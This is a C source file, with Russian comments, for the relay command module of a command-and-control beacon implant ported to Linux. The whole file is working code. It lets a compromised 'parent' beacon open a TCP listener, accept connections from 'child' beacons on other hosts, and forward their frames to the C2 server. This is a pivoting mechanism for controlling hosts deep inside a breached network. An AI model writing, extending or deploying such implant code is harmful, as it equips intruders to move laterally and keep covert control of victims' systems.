// cmd_relay.c — цепочный пивот: дочерний бикон → родительский → C2
// Linux-порт beacon/commands/cmd_relay.c (WinSock → POSIX, CRITICAL_SECTION → pthread_mutex).
//
// Родительский бикон открывает TCP-порт; дочерние биконы подключаются
// к нему и общаются с C2-сервером через родителя.
//
//   OP_RELAY_START {port u32}
//       Открыть TCP listener; каждый принятый клиент — дочерний бикон.
//
//   OP_RELAY_STOP  {port u32}
//       Закрыть listener и все дочерние соединения на этом порту.
//
//   OP_RELAY_RESP  {child_uid u32, data bytes}
//       Записать data в сокет указанного дочернего бикона.
//       data — полный raw TCP-кадр [u32 total BE][u8 type][payload].
//
// Формат relay-кадра (task_id = RELAY_TASK_MAGIC, отправляется серверу):
//   [u32 child_uid BE][u8 tport_type][payload...]

#include "../core/beacon.h"
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

// ---- константы -----------------------------------------------------------

#define RELAY_CHILD_MAX  8    // макс. одновременных дочерних биконов
#define RELAY_OUT_MAX    128  // глубина очереди исходящих кадров
#define RELAY_FRAME_MAX  (2u * 1024u * 1024u)  // 2 МБ — макс. TCP-кадр

// ---- типы ----------------------------------------------------------------

typedef struct {
    volatile int  active;        // 1 = слот занят
    uint32_t      child_uid;     // случайный идентификатор дочернего бикона
    int           sock;          // TCP-сокет дочернего бикона
    pthread_t     thread;        // поток relay_child_thread
    int           thread_valid;  // 1 = pthread_create вернул 0
} RelayChild;

typedef struct {
    uint8_t* buf;  // выделенный буфер [u32 uid][u8 type][payload]
    uint32_t len;
} RelayOutEntry;

// ---- глобальное состояние ------------------------------------------------

static RelayChild        g_relay_children[RELAY_CHILD_MAX];
static int               g_relay_lsock   = -1;
static pthread_t         g_relay_lthread;
static int               g_relay_lthread_valid = 0;
static volatile int      g_relay_running = 0;
static volatile int      g_relay_inited  = 0;

static pthread_mutex_t   g_relay_mtx = PTHREAD_MUTEX_INITIALIZER;
static RelayOutEntry     g_relay_out[RELAY_OUT_MAX];
static int               g_relay_out_head = 0;
static int               g_relay_out_tail = 0;

// ---- инициализация -------------------------------------------------------

static void relay_init(void) {
    if (__atomic_load_n(&g_relay_inited, __ATOMIC_SEQ_CST)) return;
    if (__atomic_exchange_n(&g_relay_inited, 1, __ATOMIC_SEQ_CST) == 0) {
        for (int i = 0; i < RELAY_CHILD_MAX; i++) {
            g_relay_children[i].active       = 0;
            g_relay_children[i].child_uid    = 0;
            g_relay_children[i].sock         = -1;
            g_relay_children[i].thread_valid = 0;
        }
    }
}

// ---- постановка кадра в очередь ------------------------------------------

static void relay_enqueue(uint8_t* buf, uint32_t len) {
    pthread_mutex_lock(&g_relay_mtx);
    int next = (g_relay_out_tail + 1) % RELAY_OUT_MAX;
    if (next != g_relay_out_head) {
        g_relay_out[g_relay_out_tail].buf = buf;
        g_relay_out[g_relay_out_tail].len = len;
        g_relay_out_tail = next;
    } else {
        // Очередь переполнена — кадр отбрасывается.
        bfree(buf);
    }
    pthread_mutex_unlock(&g_relay_mtx);
}

// ---- вспомогательные функции сокетов ------------------------------------

static int relay_recv_all(int fd, uint8_t* p, size_t n) {
    while (n) {
        ssize_t r = recv(fd, p, n, 0);
        if (r <= 0) return -1;
        p += r; n -= (size_t)r;
    }
    return 0;
}

static int relay_send_all(int fd, const uint8_t* p, size_t n) {
    while (n) {
        ssize_t r = send(fd, p, n, MSG_NOSIGNAL);
        if (r <= 0) return -1;
        p += r; n -= (size_t)r;
    }
    return 0;
}

// ---- поток обслуживания дочернего бикона ---------------------------------

static void* relay_child_thread(void* arg) {
    RelayChild* c = (RelayChild*)arg;

    while (__atomic_load_n(&c->active, __ATOMIC_SEQ_CST)) {
        // Читаем заголовок TCP-кадра: [u32 total BE][u8 type].
        uint8_t hdr[5];
        if (relay_recv_all(c->sock, hdr, 5) != 0) break;

        uint32_t total =
            ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16) |
            ((uint32_t)hdr[2] <<  8) |  (uint32_t)hdr[3];
        if (total < 1 || total > RELAY_FRAME_MAX) break;
        uint8_t  ttype    = hdr[4];
        uint32_t body_len = total - 1;

        // Формируем relay-запись: [u32 child_uid BE][u8 ttype][body...]
        uint32_t entry_len = 5u + body_len;  // 4(uid) + 1(type) + body
        uint8_t* entry = (uint8_t*)bmalloc(entry_len);
        if (!entry) break;

        entry[0] = (uint8_t)(c->child_uid >> 24);
        entry[1] = (uint8_t)(c->child_uid >> 16);
        entry[2] = (uint8_t)(c->child_uid >>  8);
        entry[3] = (uint8_t)(c->child_uid);
        entry[4] = ttype;

        // Читаем тело кадра.
        if (body_len > 0 && relay_recv_all(c->sock, entry + 5, body_len) != 0) {
            bfree(entry);
            break;
        }

        relay_enqueue(entry, entry_len);
    }

    __atomic_store_n(&c->active, 0, __ATOMIC_SEQ_CST);
    return NULL;
}

// ---- поток приёма новых дочерних биконов ---------------------------------

static void* relay_accept_thread(void* arg) {
    (void)arg;

    while (__atomic_load_n(&g_relay_running, __ATOMIC_SEQ_CST)) {
        struct sockaddr_in cli;
        socklen_t csz = sizeof(cli);
        int s = accept(g_relay_lsock, (struct sockaddr*)&cli, &csz);
        if (s < 0) break;
        sock_nosigpipe(s);

        // Найти свободный слот.
        int slot = -1;
        for (int i = 0; i < RELAY_CHILD_MAX; i++) {
            int expected = 0;
            if (__atomic_compare_exchange_n(&g_relay_children[i].active,
                    &expected, 1, 0, __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) {
                slot = i;
                break;
            }
        }
        if (slot < 0) { close(s); continue; }

        // Случайный child_uid через штатный bc_random.
        uint32_t uid = 0;
        bc_random((uint8_t*)&uid, sizeof(uid));

        g_relay_children[slot].child_uid    = uid;
        g_relay_children[slot].sock         = s;

        bdbg("[relay] child connected\n");

        if (pthread_create(&g_relay_children[slot].thread, NULL,
                           relay_child_thread, &g_relay_children[slot]) != 0) {
            close(s);
            g_relay_children[slot].sock = -1;
            __atomic_store_n(&g_relay_children[slot].active, 0, __ATOMIC_SEQ_CST);
            g_relay_children[slot].thread_valid = 0;
        } else {
            g_relay_children[slot].thread_valid = 1;
            pthread_detach(g_relay_children[slot].thread);
        }
    }

    __atomic_store_n(&g_relay_running, 0, __ATOMIC_SEQ_CST);
    return NULL;
}

// ---- обработчики команд --------------------------------------------------

static void relay_msg(const BeaconTask* t, const char* prefix, uint32_t port) {
    out_begin(t->id, RESP_OUTPUT);
    out_write(prefix, strlen(prefix));
    if (port) {
        char ps[8]; int n = 0;
        uint32_t v = port;
        char tmp[8]; int m = 0;
        while (v) { tmp[m++] = (char)('0' + v % 10); v /= 10; }
        while (m) ps[n++] = tmp[--m];
        out_write(ps, (size_t)n);
    }
    out_write("\n", 1);
}

// OP_RELAY_START: открыть TCP listener.
void cmd_relay_start(const BeaconTask* t) {
    relay_init();

    uint32_t port = 0;
    kv_get_u32(t->pay, t->pay_len, "port", &port);
    if (!port) {
        relay_msg(t, "[relay] bad port\n", 0);
        return;
    }

    int expected = 0;
    if (!__atomic_compare_exchange_n(&g_relay_running, &expected, 1,
            0, __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) {
        relay_msg(t, "[relay] already running on port ", port);
        return;
    }

    int ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ls < 0) {
        __atomic_store_n(&g_relay_running, 0, __ATOMIC_SEQ_CST);
        relay_msg(t, "[relay] socket() failed\n", 0);
        return;
    }
    sock_nosigpipe(ls);
    int reuse = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((uint16_t)port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(ls, (struct sockaddr*)&addr, sizeof(addr)) != 0 ||
        listen(ls, RELAY_CHILD_MAX) != 0) {
        close(ls);
        __atomic_store_n(&g_relay_running, 0, __ATOMIC_SEQ_CST);
        bdbg("[relay] bind/listen failed\n");
        relay_msg(t, "[relay] bind/listen failed on port ", port);
        return;
    }
    g_relay_lsock = ls;

    if (pthread_create(&g_relay_lthread, NULL, relay_accept_thread, NULL) != 0) {
        close(ls);
        g_relay_lsock = -1;
        __atomic_store_n(&g_relay_running, 0, __ATOMIC_SEQ_CST);
        g_relay_lthread_valid = 0;
        bdbg("[relay] pthread_create failed\n");
        relay_msg(t, "[relay] pthread_create failed, port ", port);
    } else {
        g_relay_lthread_valid = 1;
        pthread_detach(g_relay_lthread);
        bdbg("[relay] listener started\n");
        relay_msg(t, "[relay] listener started on port ", port);
    }
}

// OP_RELAY_STOP: закрыть listener и все дочерние соединения.
void cmd_relay_stop(const BeaconTask* t) {
    relay_init();
    __atomic_store_n(&g_relay_running, 0, __ATOMIC_SEQ_CST);
    if (g_relay_lsock >= 0) {
        close(g_relay_lsock);
        g_relay_lsock = -1;
    }
    for (int i = 0; i < RELAY_CHILD_MAX; i++) {
        if (__atomic_load_n(&g_relay_children[i].active, __ATOMIC_SEQ_CST) &&
            g_relay_children[i].sock >= 0) {
            close(g_relay_children[i].sock);
            g_relay_children[i].sock = -1;
        }
        __atomic_store_n(&g_relay_children[i].active, 0, __ATOMIC_SEQ_CST);
    }
    relay_msg(t, "[relay] stopped\n", 0);
}

// OP_RELAY_RESP: записать raw TCP-кадр в сокет дочернего бикона.
void cmd_relay_resp(const BeaconTask* t) {
    relay_init();
    uint32_t child_uid = 0;
    kv_get_u32(t->pay, t->pay_len, "child_uid", &child_uid);
    const uint8_t* data = NULL; uint32_t dlen = 0;
    kv_find(t->pay, t->pay_len, "data", &data, &dlen);
    if (!data || !dlen) return;

    for (int i = 0; i < RELAY_CHILD_MAX; i++) {
        if (!__atomic_load_n(&g_relay_children[i].active, __ATOMIC_SEQ_CST)) continue;
        if (g_relay_children[i].child_uid != child_uid) continue;
        int s = g_relay_children[i].sock;
        if (s < 0) return;
        if (relay_send_all(s, data, dlen) != 0) {
            close(s);
            g_relay_children[i].sock = -1;
            __atomic_store_n(&g_relay_children[i].active, 0, __ATOMIC_SEQ_CST);
        }
        return;
    }
}

// ---- периодическая отправка накопленных relay-кадров ---------------------

void relay_flush_pending(const TransportVtbl* t) {
    if (!__atomic_load_n(&g_relay_inited, __ATOMIC_SEQ_CST)) return;

    for (;;) {
        RelayOutEntry entry;
        pthread_mutex_lock(&g_relay_mtx);
        if (g_relay_out_head == g_relay_out_tail) {
            pthread_mutex_unlock(&g_relay_mtx);
            break;
        }
        entry = g_relay_out[g_relay_out_head];
        g_relay_out_head = (g_relay_out_head + 1) % RELAY_OUT_MAX;
        pthread_mutex_unlock(&g_relay_mtx);

        transport_direct_send(t, RELAY_TASK_MAGIC, entry.buf, entry.len);
        bfree(entry.buf);
    }
}
